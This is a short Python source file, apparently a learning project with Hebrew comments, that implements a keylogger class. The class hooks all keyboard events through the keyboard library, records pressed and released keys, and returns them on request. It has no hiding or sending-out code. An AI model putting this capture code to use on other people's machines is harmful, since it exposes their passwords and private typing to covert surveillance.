from I_key_logger_service import IKeyLoggerService
import keyboard


class KeyLoggerService(IKeyLoggerService):

    """  מימוש מחלקה להקלטת מקשים בשימוש בספריית keyboard """


    """" יצירת משתנה לשמירת המקשים שנלחצו """
    def __init__(self):
        self.keys = []


    """"  פונקציה שתפעל בהקשה על מקש """
    def _on_event(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            if len(key)> 1:
                key = f"[{key}]"
            self.keys.append(key)

        elif len(event.name)>1 and event.event_type == keyboard.KEY_UP:
                self.keys.append( f"[{event.name} END]")
                
    """" פונקציה להתחלת הקלטה"""
    def start_logging(self)-> None:
        keyboard.hook(self._on_event)

    """ פונקציה לסיום הקלטה"""
    def stop_logging(self):
        keyboard.unhook_all()

    """ פונקציה לקבלת המקשים שנלחצו"""

    def get_logged_keys(self) -> list:
        requested_keys = self.keys
        self.keys = []
        return requested_keys